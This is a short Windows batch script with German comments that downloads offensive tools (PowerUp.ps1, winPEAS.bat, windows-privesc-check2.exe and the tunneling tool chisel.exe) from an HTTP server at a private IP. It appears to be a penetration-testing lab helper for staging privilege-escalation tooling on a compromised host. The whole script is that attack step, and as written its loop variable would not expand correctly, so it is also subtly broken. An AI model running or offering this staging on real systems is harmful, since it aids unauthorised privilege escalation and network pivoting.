@echo off

:: Editiere die Ziel-IP-Adresse hier
set target_ip=192.168.45.185:8000/download

:: Basis-URL für den Dateidownload
set "base_url=http://%target_ip%"

:: Schleife durch die Dateien und lade sie herunter
for %%i in ("/PowerUp.ps1" "/chisel.exe" "/winPEAS.bat" "/windows-privesc-check2.exe") do (
  set "url=%base_url%%%i"
  echo Lade Datei herunter: %%i
  curl -O "%url%" )

